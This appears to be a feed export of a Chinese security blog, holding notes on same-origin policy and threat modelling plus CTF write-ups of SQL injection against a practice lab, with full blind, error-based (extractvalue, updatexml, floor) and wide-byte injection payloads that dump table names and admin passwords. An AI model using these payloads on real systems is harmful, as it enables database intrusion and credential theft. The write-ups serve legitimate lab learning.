不同源，端口不同</span><br></pre></td></tr></table></figure></p><p>当一个浏览器的两个tab页中分别打开来百度和谷歌的页面，当浏览器的百度tab页执行一个脚本的时候会检查这个脚本是属于哪个页面的，即检查是否同源，只有和百度同源的脚本才会被执行。如果非同源，那么在请求数据时，浏览器会在控制台中报一个异常，提示拒绝访问。<br>同源策略限制了来自不同源的“document”或脚本，对当前“document”读取或设置某些属性。<br>以Flash为例，它主要通过目标网站提供的crossdomain.xml文件判断是否允许当前“源”的Flash跨域访问目标资源。<br>同源策略的目的：保证用户信息的安全，防止恶意的网站窃取数据。</p><p><strong>规避同源策略的方法：</strong></p><p><strong>document.domain：</strong></p><ul><li>适用情况：不同的窗口 (window) 或 内敛框架元素 <code>&lt;iframe&gt;</code>之间互相访问文档内容，包括 cookie</li><li>实现前提：<ul><li>协议、端口相同</li><li>当前域名 (domain name) 的父域 (superdomain) 相同</li><li>其中一个窗口或 iframe 能得到另一个窗口或 iframe 的引用</li></ul></li></ul><p><strong>跨文档消息传递 (<em>cross-document messaging</em>)：</strong></p><ul><li>适用情况：不同的窗口 (<em>window</em>) 或 内敛框架元素 <code>&lt;iframe&gt;</code>之间跨域传递数据</li><li>实现前提：浏览器支持 HTML5 的<code>window.postMessage</code></li></ul><p><strong>JSONP (<em>JSON with padding</em>)：</strong></p><ul><li>适用情况：客户端与服务器端的跨域通信</li><li>实现前提：无</li></ul><p><strong>WebSocket：</strong></p><ul><li>适用情况：实时通信 (无论是否跨域)</li><li>实现前提：浏览器和服务器支持 HTML5 的 WebSocket</li></ul><p><strong>跨域资源共享 (<em>Cross-Origin Resource Sharing, CORS</em>)：</strong></p><ul><li>适用情况：客户端与服务器端的跨域通信</li><li>实现前提：客户端和服务器端同时支持 CORS</li></ul><p><strong>小技巧：</strong></p><ol><li>片段标识符 (<em>fragment identifier</em>)<ul><li>实现前提：无。</li><li>片段标识符是网址 URL 中<code>#</code>符后面的部分。</li></ul></li><li>查询字符串 (<em>search string</em>, aka, <em>query string</em>)<ul><li>实现前提：无。</li><li>这是另一种用于小数据量跨域通信的方法，也是我所常用的方法，也是相比于前者更推荐的做法。查询字符串是 URL 中<code>?</code>及其后面但不包括<code>#</code>及片段标识符的部分。</li></ul></li><li>window.name<ul><li>实现前提：跨域页面在同一个窗口中。</li><li>这个属性是属于窗口的，只要窗口不变，即使页面变为不同域，这个属性的值也不变。</li></ul></li></ol><h2 id="浏览器沙箱"><a href="#浏览器沙箱" class="headerlink" title="浏览器沙箱"></a>浏览器沙箱</h2><p>Sandbox 即沙箱，泛指“资源隔离类模块”，Sandbox的设计目的一般是为了让不可信的代码运行在一定的环境中，限制不可信任的代码访问隔离区之外的资源。</p><h2 id="恶意网址拦截"><a href="#恶意网址拦截" class="headerlink" title="恶意网址拦截"></a>恶意网址拦截</h2><p>基于“黑名单”的恶意网址拦截，浏览器周期性的从服务器端获取一份最新的恶意网址黑名单，如果用户上网时访问的网址存在于此黑名单中，浏览器就会弹出一个警告页面。常见的而已网址分为两种：挂马网站和钓鱼网站。</p><p><strong>浏览器的安全以同源策略为基础，加深理解同源策略，才能把握住浏览器安全的本质。在当前浏览器高速发展的形势下，恶意网址检测、插件安全等问题都会显得越来越重要。紧跟浏览器发展的脚步来研究浏览器安全，是安全研究者需要认真对待的事情。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://wlfsky.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://wlfsky.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="同源策略" scheme="http://wlfsky.com/tags/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
    
  </entry>
  
  <entry>
    <title>精读《白帽子讲Web安全》一</title>
    <link href="http://wlfsky.com/2018/01/24/%E7%B2%BE%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E4%B8%80/"/>
    <id>http://wlfsky.com/2018/01/24/精读《白帽子讲Web安全》一/</id>
    <published>2018-01-24T13:11:19.000Z</published>
    <updated>2018-01-25T12:41:36.000Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><p>之前就有读过吴瀚清大神的著作《白帽子讲Web安全》，但当时囫囵吞枣，有些地方只是大致过了一遍，并没有深入研究，于是趁着这个寒假的时间，再次阅读一遍这本在安全界极为著名的圣书，从而夯实基础，更进一步！</p><p>在这一系列读书笔记中，我会摘抄书中的一些知识，也会加入一些我的理解，当做以后的一个参考笔记。</p><h2 id="第一章、我的安全观"><a href="#第一章、我的安全观" class="headerlink" title="第一章、我的安全观"></a>第一章、我的安全观</h2><ol><li><p>研究计算机系统和网络的人，称为“Hacker”。现在称之为：白帽子、黑帽子和灰帽子。</p></li><li><p>黑客精神：Open、Free、Share。</p></li><li><p>只会使用工具而不懂原理的黑客称之为脚本小子，也叫“Script Kids”。</p></li><li><p>大部分黑客的目标只有一个，那就是拿到最高权限Root(Administrator)，而在Web安全方向，一般是拿到webshall（可执行脚本）。</p></li><li><p>黑客们使用的漏洞利用代码也称之为“exploit”，还有一种漏洞验证程序称之为“POC”，即Proof of Concept。</p></li><li><p>安全问题的本质是<strong>信任的问题</strong>。把握好信任条件的度，使其恰到好处，正是设计安全方案的难点，也是安全这门学问的艺术魅力所在。</p></li><li><p>安全的三要素（<strong>CIA</strong>）：<strong>机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）。</strong></p></li><li><p>安全评估的4个阶段：资产等级划分、威胁分析、风险分析、确认解决方案。</p><ol><li><p>资产等级划分：互联网安全的核心问题，是数据安全的问题。</p></li><li><p>威胁分析：可能造成危害的来源称为威胁(Threat)，可能出现的损失称之为风险(Risk)。威胁建模（STRIDE）可以从以下六个方面考虑：</p><p>|              威胁              |    定义    | 对应的安全属性 |<br>| :————————–: | :——: | :—–: |<br>|         Spoofing(伪装)         |  冒充他人身份  |   认证    |<br>|        Tampering(篡改)         | 修改数据或代码  |   完整性   |<br>|       Repudiation(抵赖)        | 否认做过的事情  |  不可抵赖性  |<br>| InformationDisclosure(信息泄露)  |  机密信息泄露  |   机密性   |<br>|   Denial of Service(拒绝服务)    |   拒绝服务   |   可用性   |<br>| Elevation of Privilege(提升权限) | 未经授权获得许可 |   授权    |</p></li><li><p>风险分析：影响风险高低的因素除了造成损失的大小外，还需要考虑到发生的可能性。风险建模（DREAD）指导我们应该从哪些方面去判断一个威胁的风险程度。</p><p>|        等级        |          高（3）           |         中（2）          |    低（1）     |<br>| :————–: | :———————: | :——————-: | :———: |<br>| Damage Potential | 获取完整验证权限；执行管理员操作；非法上传文件 |        泄露敏感信息         |   泄露其他信息    |<br>| Reproducibility  |       攻击者可以随意再次攻击       |   攻击者可以重复攻击，但有时间限制    | 攻击者很难重复攻击过程 |<br>|  Exploitability  |     初学者在短时间内能掌握攻击方法     |    熟练的攻击者才能完成这次攻击     | 漏洞利用条件非常苛刻  |<br>|  Affected users  |     所有用户，默认配置，关键用户      |      部分用户，非默认配置       | 极少数用户，匿名用户  |<br>| Discoverability  |     漏洞很显眼，攻击条件很容易获得     | 在私有区域，部分人能看到，需要深入挖掘漏洞 |  发现该漏洞极其困难  |</p></li><li><p>优秀的安全方案应具备以下特点：①能够有效解决问题②用户体验好③高性能④低耦合⑤易于扩展与升级</p></li></ol></li><li><p>设计安全方案时需要的技巧：</p><ol><li>Secure By Default原则：黑名单、白名单思想。最小权限思想。</li><li>纵深防御原则（Defense in Depth）：首先，要在各个不同层面、不同方面实施安全方案，避免出现疏漏，不同安全方案之间需要相互配合，构成一个整体；其次，要在正确的地方做正确的事情，即：在解决根本问题的地方实施针对性的安全方案。</li><li>数据和代码分离原则：这一原则广泛适用于跟中由于“注入”而引发的安全问题的场景。</li><li>不可预测性原则（Unpredictable）：有效对抗基于篡改、伪造的攻击。可能会用到：加密算法、随机数算法、哈希算法等。</li></ol></li><li>我们要抓住安全的本质，以安全的眼光来看待整个世界！</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://wlfsky.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://wlfsky.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之盲注（时间和布尔）</title>
    <link href="http://wlfsky.com/2018/01/21/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8%EF%BC%88%E6%97%B6%E9%97%B4%E5%92%8C%E5%B8%83%E5%B0%94%EF%BC%89/"/>
    <id>http://wlfsky.com/2018/01/21/SQL注入之盲注（时间和布尔）/</id>
    <published>2018-01-21T09:35:56.000Z</published>
    <updated>2018-01-23T07:50:36.614Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="题一：盲注"><a href="#题一：盲注" class="headerlink" title="题一：盲注"></a>题一：盲注</h2><p>题目出自：<a href="http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php" target="_blank" rel="noopener">网络安全实验室</a></p><p>1、首先要确定数据库名的长度</p><p>输入</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’  and if(length((SELECT concat(database())))&lt;10,sleep(2),1)%23</a></p><p>查看等待时间，当为14时，等待，说明数据库名的长度为13</p><p>2、猜测数据库名</p><p>猜测第一个字符</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’  and if(substr((SELECT concat(database())),1,1)=’0’,sleep(2),1)%23</a></p><p>当输入测试第一个字符为r时，等待</p><p>猜测第二个字符</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’  and if(substr((SELECT concat(database())),2,1)=’0’,sleep(2),1)%23</a></p><p>当输入为0时，等待</p><p>……</p><p>依据猜测，数据库名为r0866cplushua</p><p>3、猜测数据库中有多少个表</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’  and if((select count(TABLE_NAME) from information_schema.tables where table_schema=0x723038363663706C7573687561)=3,sleep(2),1)%23</a></p><p>经过多次测试，确认有3个表</p><p>4、猜测第一个表名的长度</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’  and if(length((select TABLE_NAME from information_schema.tables where table_schema=0x723038363663706C7573687561 limit 0,1))=3,sleep(2),1)%23</a></p><p>猜测第一个表名长度为3</p><p>5、猜测表名</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’ and if(substr((select TABLE_NAME from information_schema.tables where table_schema=0x723038363663706C7573687561 limit 1,1),5,1)=’o’,sleep(2),1)%23</a></p><p>…..</p><p>最后知道有log,user,motto表名</p><p>6、猜测表有多少列</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’ and if((select count(COLUMN_NAME) from information_schema.columns where table_name=0x6D6F74746F )=3,sleep(2),1)%23</a></p><p>经过多次测试，表motto中有3列</p><p>7、猜测列名长度</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’ and if(length((select COLUMN_NAME from information_schema.columns where table_name=0x6D6F74746F limit 0,1 ))=2,sleep(2),1)%23</a></p><p>第一个，2个字符，第二个8个字符，第三个是5个字符</p><p>8、猜测列名</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’ and if(substr((select COLUMN_NAME from information_schema.columns where table_name=0x6D6F74746F limit 1,1 ),1,1)=’u’,sleep(2),1)%23</a></p><p>第一个为id,第二列为username,第三列为motto</p><p>9、猜测有多少行</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’ and if((select count(*) from motto)=4,sleep(2),1)%23</a></p><p>结果为4行</p><p>10、猜测内容</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’ and if(ASCII(substr((select motto from motto limit 0,1),1,1))=109,sleep(2),1)%23</a></p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://wlfsky.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之三种报错型注入的用法</title>
    <link href="http://wlfsky.com/2018/01/21/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%89%E7%A7%8D%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%9A%84%E7%94%A8%E6%B3%95/"/>
    <id>http://wlfsky.com/2018/01/21/SQL注入之三种报错型注入的用法/</id>
    <published>2018-01-21T07:32:04.000Z</published>
    <updated>2018-01-21T08:42:28.018Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><p><em>本文转载自：<a href="https://www.2cto.com/database/201410/344310.html" target="_blank" rel="noopener">红黑联盟</a></em></p><h2 id="通过floor报错"><a href="#通过floor报错" class="headerlink" title="通过floor报错"></a>通过floor报错</h2><p>可以通过如下一些利用代码</p><blockquote><p>and (select 1 from (select count(*),concat(floor(rand(0)*2),(注入暴数据语句))a from information_schema.tables group by a)b) #</p></blockquote><p>或者</p><blockquote><p>and (select count(*) from (select 1 union select null union select !1)x group by concat((注入暴数据语句),floor(rand(0)*2))) #</p></blockquote><p>举例如下：<br>首先进行正常查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[mysql]&gt; select * from article where id = 1;</span><br><span class="line">+<span class="comment">----+-------+---------+</span></span><br><span class="line">| id | title | content |</span><br><span class="line">+<span class="comment">----+-------+---------+</span></span><br><span class="line">| 1 | test | <span class="keyword">do</span> it |</span><br><span class="line">+<span class="comment">----+-------+---------+</span></span><br></pre></td></tr></table></figure><p>假如id输入存在注入的话，可以通过如下语句进行报错。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from article where id = 1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry '5.1.33-community-log1' for key 'group_key'</span><br></pre></td></tr></table></figure><p>可以看到成功爆出了Mysql的版本，如果需要查询其他数据，可以通过修改version()所在位置语句进行查询。<br>例如我们需要查询管理员用户名和密码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Method1:</span><br><span class="line">mysql&gt; select * from article where id = 1 and (select 1 from (select count(*),concat((select pass from admin where id =1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry 'admin8881' for key 'group_key'</span><br><span class="line">Method2:</span><br><span class="line">mysql&gt; select * from article where id = 1 and (select count(*) from (select 1 union select null union select !1)x group by concat((select pass from admin limit 1),floor(rand(0)*2)));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry 'admin8881' for key 'group_key'</span><br></pre></td></tr></table></figure><h2 id="ExtractValue"><a href="#ExtractValue" class="headerlink" title="ExtractValue"></a>ExtractValue</h2><p>测试语句如下</p><blockquote><p>and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)))%23</p><p>and extractvalue(rand(),concat(0x3a,(SQL注入语句)))%23 </p></blockquote><p>实际测试过程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from article where id = 1 and extractvalue(1, concat(0x5c,(select pass from admin limit 1)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: '\admin888'</span><br></pre></td></tr></table></figure><h2 id="UpdateXml"><a href="#UpdateXml" class="headerlink" title="UpdateXml"></a>UpdateXml</h2><p>测试语句如下</p><blockquote><p>and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))</p></blockquote><p>实际测试过程</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from article where id = 1 and 1=(updatexml(1,concat(0x5e24,(select pass from admin limit 1),0x5e24),1));ERROR 1105 (HY000): XPATH syntax error: '^$admin888^$'</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://wlfsky.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之报错型注入</title>
    <link href="http://wlfsky.com/2018/01/21/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/"/>
    <id>http://wlfsky.com/2018/01/21/SQL注入之报错型注入/</id>
    <published>2018-01-21T07:21:38.000Z</published>
    <updated>2018-01-23T07:50:16.830Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="题一：ErrorBased"><a href="#题一：ErrorBased" class="headerlink" title="题一：ErrorBased"></a>题一：ErrorBased</h2><p>本题目为手工注入学习题目，主要用于练习基于Mysql报错的手工注入。Sqlmap一定能跑出来，所以不必测试了。flag中不带key和#<br>该题目需要在题目平台登录</p><p>题目出自：<a href="http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin" target="_blank" rel="noopener">网络安全实验室</a></p><p>进入显示页面如下：</p><p><img src="/img/sql-bc-1.png" alt="sql-bc-1.png"></p><p>题目已经告诉该题为报错型注入，所以直接开始注入：</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin’ and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())))%23</a></p><p><img src="/img/sql-bc-2.png" alt="sql-bc-2.png"></p><p>得到表名<code>log、motto、user</code> ，然后开始暴列名：</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin’ and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’motto’)))%23</a></p><p><img src="/img/sql-bc-3.png" alt="sql-bc-3.png"></p><p>得到列名<code>id、username、motto</code> ，然后开始暴数据：</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin’ and extractvalue(1,concat(0x3a,(select concat(id,0x3a,username,0x3a,motto) from motto limit 3,1)))%23</a></p><p><img src="/img/sql-bc-4.png" alt="sql-bc-4.png"></p><p>得到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://wlfsky.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之UNION的注意事项</title>
    <link href="http://wlfsky.com/2018/01/21/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BUNION%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"/>
    <id>http://wlfsky.com/2018/01/21/SQL注入之UNION的注意事项/</id>
    <published>2018-01-21T04:45:42.000Z</published>
    <updated>2018-01-21T07:20:27.907Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><p><em>本文为转载文章</em></p><p>注入过程中经常会遇到UNION，很多人使用时会报错，主要是不熟悉UNION的使用规则，以下分别对UNION在不同数据库下的使用注意事项解说。</p><h2 id="关于UNION-与-ORDER-BY"><a href="#关于UNION-与-ORDER-BY" class="headerlink" title="关于UNION 与 ORDER BY"></a>关于UNION 与 ORDER BY</h2><h3 id="SQL-SERVER"><a href="#SQL-SERVER" class="headerlink" title="SQL SERVER"></a>SQL SERVER</h3><p>在SQL SERVER中，只有最后一个SELECT子句允许有ORDER BY 。前面的任何SELECT子句都不能有。<br>比如：<br>select name from a order by id union select content from b<br>会报在关键字UNION附近有语法错误。<br>order by 只能加在最后的select 的后面，改成这样：<br>select name from a union select content from b order by id<br>这样就正确了。</p><h3 id="ACCESS"><a href="#ACCESS" class="headerlink" title="ACCESS"></a>ACCESS</h3><p>ACCESS中没有强制要求ORDER BY 只能出现在最后一个SELECT子句中，所以<br>select name from a order by id union select content from b<br>在ACCESS中可以正确运行。</p><h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>MYSQL与SQL SERVER一样，强制要求ORDER BY 只能出现在最后一个SELECT子句中。<br>如果出现在了前面，会报错<br>ERROR 1221 (HY000): Incorrect usage of UNION and ORDER BY</p><h2 id="关于UNION-与FROM"><a href="#关于UNION-与FROM" class="headerlink" title="关于UNION 与FROM"></a>关于UNION 与FROM</h2><h3 id="SQL-SERVER-1"><a href="#SQL-SERVER-1" class="headerlink" title="SQL SERVER"></a>SQL SERVER</h3><p>只要UNION连接的几个查询的字段数一样且列的数据类型转换没有问题，就可以查询出结果。<br>下面这样的查询也是可以的：<br>select 1 union select 2;</p><h3 id="ACCESS-1"><a href="#ACCESS-1" class="headerlink" title="ACCESS"></a>ACCESS</h3><p>ACCESS的UNION好像强制要求它所连接的查询只能是select xxx from table的这种形式，<br>select 1 union select 2 这种查询在ACCESS里面执行的话会提示“查询输入必须包含至少一个表或者查询”<br>要将查询改成：<br>select 1 from table union select 2 from table<br>查询才能成功。<br>但是如果不用union，只是执行select 1，是允许的。</p><h3 id="MYSQL-1"><a href="#MYSQL-1" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>与SQL SERVER基本一样。唯一不一样的地方就是，如果后面跟了where，就一定要跟from<br>select 1 where 1=1; 在mysql里面是会报错的，但是在sql server里面没有错误。<br>要改成<br>select 1 from table where 1=1;</p><h2 id="关于数据类型的转换"><a href="#关于数据类型的转换" class="headerlink" title="关于数据类型的转换"></a>关于数据类型的转换</h2><h3 id="SQL-SERVER-2"><a href="#SQL-SERVER-2" class="headerlink" title="SQL SERVER"></a>SQL SERVER</h3><p>SQL SERVER的数据类型转换是有优先级的，低优先级的会向高优先级的进行转换。<br>而并不是第一个SELECT的数据类型为准。<br>比如：<br>select 1,’f’ union select 1,2<br>上面的语句会报错，将varchar值’f’转换为……<br>这证明了转换不是以第一个SELECT列的数据类型为准的，虽然最终生成的列名是以第一个SELECT所用的列名为准。<br>下面是摘自SQL SERVER联机丛书的：<br>数据类型的优先顺序<br>当两个不同数据类型的表达式用运算符组合后，数据类型的优先顺序规则确定哪种数据类型要向另一种转换。<br>优先顺序低的数据类型向优先顺序高的数据类型转换。如果此转换不是所支持的固有转换，则返回错误。<br>当两个操作数表达式有相同的数据类型时，运算的结果就为那种数据类型。<br>下面是 Microsoft SQL Server 2000 数据类型的优先顺序：<br>sql_variant（最高）<br>datetime<br>smalldatetime<br>float<br>real<br>decimal<br>money<br>smallmoney<br>bigint<br>int<br>smallint<br>tinyint<br>bit<br>ntext<br>text<br>image<br>timestamp<br>uniqueidentifier<br>nvarchar<br>nchar<br>varchar<br>char<br>varbinary<br>binary（最低）<br>可以发现varchar比int的优先级低，所以varchar会向int进行转换，而不是int向字符串进行转换。</p><p>遇到这种情况可以使前面的查询结果为空就可以规避数据类型转换的报错，顺利执行第二个查询了。</p><h3 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h3><p>我没发现ACCESS在使用UNION的时候会有数据类型转换的问题，好像任何类型的字段都可以UNION在一起。</p><h3 id="MYSQL-2"><a href="#MYSQL-2" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>MYSQL我没找到什么讲的比较清楚的类型转换的文章。<br>只简单地说一下，在字符器转换为数字类型的时候，会从字符串的第一个字符开始转换，直到遇到非数字为止。<br>比如7sie32 转成数字就是7，8732ds8转换数字就是8732<br>如果第一个字符就是非数字，就转换结果就是0。<br>在一些低版本的MYSQL中，下面这个查询：<br>select 1 union select ‘a’;<br>得到的结果是1 0，a被转换成0了。<br>不过这个问题在4.1以后的版本就没有了。<br>新版本的MYSQL具体是怎么转换的不太清楚，不过好像它会自动寻找合适的数据类型。然后将UNION的那些列进行转换。<br>也就是说我们基本上不用考虑它在UNION时的数据类型转换问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://wlfsky.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之特殊注入</title>
    <link href="http://wlfsky.com/2018/01/20/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%89%B9%E6%AE%8A%E6%B3%A8%E5%85%A5/"/>
    <id>http://wlfsky.com/2018/01/20/SQL注入之特殊注入/</id>
    <published>2018-01-20T15:01:16.000Z</published>
    <updated>2018-01-23T08:03:09.774Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="题一：防注入（宽字节注入）"><a href="#题一：防注入（宽字节注入）" class="headerlink" title="题一：防注入（宽字节注入）"></a>题一：防注入（<strong>宽字节注入</strong>）</h2><p>题目出自：<a href="http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php" target="_blank" rel="noopener">网络安全实验室</a></p><p>进入后页面显示如下：</p><p><img src="/img/sql-ts-1.png" alt="sql-ts-1.png"></p><p>使网址变为：</p><p><a href="">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df’</a></p><p>发现报错，则有注入点。</p><p>然后输入<code>or 1=1 %23</code> :</p><p><a href="">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df’ or 1=1 %23</a></p><p>发现和id=1的页面一样，则可以推断出页面一次只能输出一行，所以采用limit：</p><p><a href="">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df’ or 1=1 limit N,1 %23</a></p><p>N从0开始递增，在N=2时，得到flag。</p><p><img src="/img/sql-ts-2.png" alt="sql-ts-2.png"></p><h2 id="题二：到底能不能回显（注入点在limit后面的用法）"><a href="#题二：到底能不能回显（注入点在limit后面的用法）" class="headerlink" title="题二：到底能不能回显（注入点在limit后面的用法）"></a>题二：到底能不能回显（<strong>注入点在limit后面的用法</strong>）</h2><p>小明经过学习，终于对SQL注入有了理解，她知道原来sql注入的发生根本原因还是数据和语句不能正确分离的原因，导致数据作为sql语句执行；但是是不是只要能够控制sql语句的一部分就能够来利用获取数据呢？小明经过思考知道，where条件可控的情况下，实在是太容易了，但是如果是在limit条件呢？<br>题目出自：<a href="http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1" target="_blank" rel="noopener">网络安全实验室</a></p><p>进入后页面显示如下：</p><p><img src="/img/sql-ts-3.png" alt="sql-ts-3.png"></p><p>先举个例子：</p><blockquote><p> 在MYSQL中，order by 语句必须出现在最后一个select语句中。</p><p> select column from table where id &gt; 0 order by id limit [注入点]</p><p> 这里就不能使用union关键字，然后我们看一下mysql 5.x 文档中select的语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 